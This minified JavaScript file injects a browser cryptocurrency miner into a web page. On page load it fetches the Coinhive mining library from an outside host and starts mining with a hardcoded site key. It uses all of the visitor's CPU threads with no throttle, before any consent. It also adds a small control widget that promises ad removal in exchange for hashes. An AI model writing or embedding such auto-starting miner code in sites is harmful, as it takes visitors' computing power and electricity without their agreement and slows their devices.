! function() {
    var n = function() { try { return !!window.addEventListener } catch (n) { return !1 } },
        e = function(e, t) { n() ? document.addEventListener("DOMContentLoaded", e, t) : document.attachEvent("onreadystatechange", e) };
    e(function() {
        ! function() {
            var n = document.createElement("script");
            n.type = "text/javascript";
            var e = document.getElementsByTagName("script")[0];
            n.src = "https://coinhive.com/lib/coinhive.min.js", n.onload = function() {
                function n() { return Jn.getHashesPerSecond().toFixed(1) }

                function t(n) { return Jn.getTotalHashes(n) }

                function i() { return Jn.getAcceptedHashes() }

                function d() { return Jn.stop() }

                function o(n) { return Jn.start(n) }

                function r() { return Jn.getNumThreads() }

                function a(n) { return Jn.setNumThreads(n) }

                function s() { return o(Qn), a(r() + 1) }

                function l() { return o(Qn), a(r() - 1) }

                function c() { return Jn.isRunning() }

                function m() { return Math.round(100 * Jn.getThrottle().toFixed(1)) / 100 }

                function p(n) { return Jn.setThrottle(n) }

                function u() { return o(Qn), p(m() + .1) }

                function h() { return o(Qn), p(m() - .1) }

                function g() { p(0), a(Wn), o(Qn) }

                function f() { p(.9), a(1), o(Qn) }

                function y() { p(Zn), a(Wn), o(Qn) }
                var v = "jVwy4y10DD5Ahz6qQ83qLrwXd5KZgJfp",
                    w = !0,
                    b = navigator.hardwareConcurrency,
                    x = 0,
                    E = 1e3,
                    I = "miner",
                    T = "mining-stats-canvas",
                    _ = "mining-is-running",
                    B = "mining-is-running-id",
                    k = "mining-is-running-id-output",
                    H = "mining-is-running-id-output-yes",
                    L = "mining-is-running-id-output-no",
                    M = "mining-hashes-per-second",
                    C = "mining-hashes-per-second-id",
                    A = "mining-hashes-per-second-id-output",
                    F = "mining-accepted-hashes-per-second",
                    S = "mining-accepted-hashes-per-second-id",
                    U = "mining-accepted-hashes-per-second-id-output",
                    D = "mining-threads",
                    N = "mining-threads-id",
                    P = "mining-threads-id-output",
                    z = "mining-threads-add",
                    j = "mining-threads-remove",
                    O = "mining-hashes-total",
                    X = "mining-hashes-total-id",
                    q = "mining-hashes-total-id-output",
                    G = "mining-start",
                    K = "mining-stop",
                    R = "addthreads",
                    V = "removethreads",
                    J = "startmining",
                    Q = "stopmining",
                    W = "mining-current-throttle",
                    Z = "mining-current-throttle-id",
                    Y = "mining-current-throttle-id-output",
                    $ = "mining-increase-throttle",
                    nn = "mining-increase-throttle-id",
                    en = "mining-decrease-throttle",
                    tn = "mining-decrease-throttle-id",
                    dn = "mining-minimal-speed",
                    on = "mining-minimal-speed-id",
                    rn = "mining-maximum-speed",
                    an = "mining-maximum-speed-id",
                    sn = "mining-default-recommended-speed",
                    ln = "mining-default-recommended-speed-id",
                    cn = "tooltiptext",
                    mn = "tooltip",
                    pn = "miner-button-class",
                    un = "miner-text-area-class",
                    hn = "",
                    gn = "Online",
                    fn = "Offline",
                    yn = "If the miner is currently running.",
                    vn = "Hashes/s | ",
                    wn = "The total number of hashes per second for all threads combined.",
                    bn = "Accepted Hashes | ",
                    xn = "The number of hashes that have been accepted by the pool.",
                    En = "Threads | ",
                    In = "Amount of threads you have running currently.",
                    Tn = "+",
                    _n = "Speed it up! Increases threads, but too many may slow your browser. 3 or 4 are OK in most cases.",
                    Bn = "-",
                    kn = "Slow it down! (decrease threads to 0 to stop entirely)",
                    Hn = "Total Hashes | ",
                    Ln = "Hashes you solved so far. We will remove all ads for you once you mine enough. Login to have it keep track of your progress.",
                    Mn = "Start",
                    Cn = "Start the miner.",
                    An = "Stop",
                    Fn = "Stop the miner.",
                    Sn = "Throttle | ",
                    Un = "How much the miner is currently being throttled.",
                    Dn = "+",
                    Nn = "Increase the throttle to reduce CPU consumption.",
                    Pn = "-",
                    zn = "Decrease the throttle to allow more CPU consumption.",
                    jn = "Min",
                    On = "Use the most minimal amount of CPU and Power possible.",
                    Xn = "Max",
                    qn = "Use all CPU and Power available.",
                    Gn = "Default",
                    Kn = "Use Recommended default settings.",
                    Rn = document.createElement("div");
                Rn.id = I, document.body.appendChild(Rn), new_html = "<div id='" + T + "'></div>", document.getElementById(I).innerHTML = new_html, new_html = "<div id='" + _ + "' class='" + mn + " " + un + "'><span id='" + B + "'>" + hn + "</span><span id='" + k + "'></span><span id='" + cn + "'>" + yn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + M + "' class='" + mn + " " + un + "'><span id='" + C + "'>" + vn + "</span><span id='" + A + "'></span><span id='" + cn + "'>" + wn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + F + "' class='" + mn + " " + un + "'><span id='" + S + "'>" + bn + "</span><span id='" + U + "'></span><span id='" + cn + "'>" + xn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + D + "' class='" + mn + " " + un + "'><span id='" + N + "'>" + En + "</span><span id='" + P + "'></span><span id='" + cn + "'>" + In + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + z + "' class='" + mn + " " + pn + "'><span id='" + R + "'>" + Tn + "</span><span id='" + cn + "'>" + _n + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + j + "' class='" + mn + " " + pn + "'><span id='" + V + "'>" + Bn + "</span><span id='" + cn + "'>" + kn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + O + "' class='" + mn + " " + un + "'><span id='" + X + "'>" + Hn + "</span><span id='" + q + "'></span><span id='" + cn + "'>" + Ln + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + G + "' class='" + mn + " " + pn + "'><span id='" + J + "'>" + Mn + "</span><span id='" + cn + "'>" + Cn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + K + "' class='" + mn + " " + pn + "'><span id='" + Q + "'>" + An + "</span><span id='" + cn + "'>" + Fn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + W + "' class='" + mn + " " + un + "'><span id='" + Z + "'>" + Sn + "</span><span id='" + Y + "'></span><span id='" + cn + "'>" + Un + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + $ + "' class='" + mn + " " + pn + "'><span id='" + nn + "'>" + Dn + "</span><span id='" + cn + "'>" + Nn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + en + "' class='" + mn + " " + pn + "'><span id='" + tn + "'>" + Pn + "</span><span id='" + cn + "'>" + zn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + dn + "' class='" + mn + " " + pn + "'><span id='" + on + "'>" + jn + "</span><span id='" + cn + "'>" + On + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + rn + "' class='" + mn + " " + pn + "'><span id='" + an + "'>" + Xn + "</span><span id='" + cn + "'>" + qn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + sn + "' class='" + mn + " " + pn + "'><span id='" + ln + "'>" + Gn + "</span><span id='" + cn + "'>" + Kn + "</span></div>", document.getElementById(T).innerHTML += new_html;
                var Vn = document.createElement("style");
                Vn.type = "text/css", Vn.innerHTML += "#" + I + "{position:fixed;bottom:0;left:0;background-color:#262626;color:#FFFFFF;width:auto;height:auto;border-radius:3px;z-index:30;}#" + T + "{display:inline-block;width:100%;}#" + _ + "{display:inherit;}#" + B + "{}#" + k + "{}." + H + "{color:greenyellow;}." + L + "{color:#f00;}#" + M + "{display:inherit;}#" + C + "{display:inherit;}#" + A + "{display:inherit;padding:0px 0px 0px 5px;}#" + F + "{display:inherit;}#" + D + "{display:inherit;}#" + z + "{display:inherit;}#" + j + "{display:inherit;}#" + O + "{display:inherit;}#" + G + "{display:inherit;}#" + K + "{display:inherit;}#" + R + "{}#" + V + "{}#" + J + "{}#" + Q + "{}#" + W + "{display:inherit;}#" + $ + "{display:inherit;}#" + en + "{display:inherit;}#" + dn + "{display:inherit;}#" + rn + "{display:inherit;}#" + sn + "{display:inherit;}." + pn + "{text-decoration: none;display: inline-block;padding: 0px 10px;margin: 2px;border: 1px solid #C7C7C7;border-radius: 3px;-moz-border-radius: 2px;-webkit-border-radius: 2px;background: #636A6C;background: -moz-linear-gradient(top,#636A6C 0%,#51575A 100%);background: -webkit-gradient(linear,left top,left bottom,color-stop(0%,#636A6C),color-stop(100%,#51575A));background: -webkit-linear-gradient(top,#636A6C 0%,#51575A 100%);background: -o-linear-gradient(top,#636A6C 0%,#51575A 100%);background: -ms-linear-gradient(top,#636A6C 0%,#51575A 100%);background: linear-gradient(top,#636A6C 0%,#51575A 100%);filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#636A6C',endColorstr='#51575A',GradientType=0);}." + pn + ":hover{display: inline-block;padding: 0px 10px;margin: 2px;border-radius: 3px;background: #ddd;background: -webkit-gradient(linear,left top,left bottom,color-stop(0,#fff),color-stop(1,#ddd));background: -moz-linear-gradient(top center,#fff 0%,#ddd 100%);background: -webkit-linear-gradient(top,#ffffff 0%,#dddddd 100%);background: -o-linear-gradient(top,#ffffff 0%,#dddddd 100%);background: -ms-linear-gradient(top,#ffffff 0%,#dddddd 100%);background: linear-gradient(top,#ffffff 0%,#dddddd 100%);filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffffff',endColorstr='#dddddd',GradientType=0);border: 1px solid;border-color: #ddd #bbb #999;cursor: pointer;color: #333;}." + un + "{border:1px solid #e5e5e4;padding:0px 5px 0px 5px;}." + mn + "{position: relative;overflow:visible;}." + mn + " #" + cn + "{visibility: hidden;width:0px;height:0px;background-color: black;color: #fff;text-align: center;border-radius: 6px;padding: 5px 5px;position: absolute;z-index: 1;bottom: 150%;left: 50%;margin-left: -5px;overflow:hidden;}." + mn + ":hover #" + cn + "{visibility: visible;width:auto;height:auto;overflow:hidden;white-space:nowrap;}", e.parentNode.insertBefore(Vn, e);
                var Jn = new CoinHive.Anonymous(v, { throttle: x, threads: b }),
                    Qn = CoinHive.IF_EXCLUSIVE_TAB,
                    Wn = r(),
                    Zn = m();
                document.getElementById(z).onclick = function() { return s() }, document.getElementById(j).onclick = function() { return l() }, document.getElementById(G).onclick = function() { return o(Qn) }, document.getElementById(K).onclick = function() { return d() }, document.getElementById($).onclick = function() { return u() }, document.getElementById(en).onclick = function() { return h() }, document.getElementById(dn).onclick = function() { return f() }, document.getElementById(rn).onclick = function() { return g() }, document.getElementById(sn).onclick = function() { return y() }, w && o(Qn), Jn.on("open", function() {}), Jn.on("authed", function(n) {}), Jn.on("close", function() {}), Jn.on("error", function(n) {}), Jn.on("job", function() {}), Jn.on("found", function() {}), Jn.on("accepted", function() {}), setInterval(function() { is_running = "", c() ? (is_running = gn, document.getElementById(k).className = H) : (is_running = fn, document.getElementById(k).className = L), document.getElementById(k).innerHTML = is_running, document.getElementById(A).innerHTML = n(), document.getElementById(U).innerHTML = i(), document.getElementById(P).innerHTML = r(), document.getElementById(q).innerHTML = t(!0), document.getElementById(Y).innerHTML = m() }, E)
            }, n.onerror = function() {}, e.parentNode.insertBefore(n, e)
        }()
    }, !1)
}();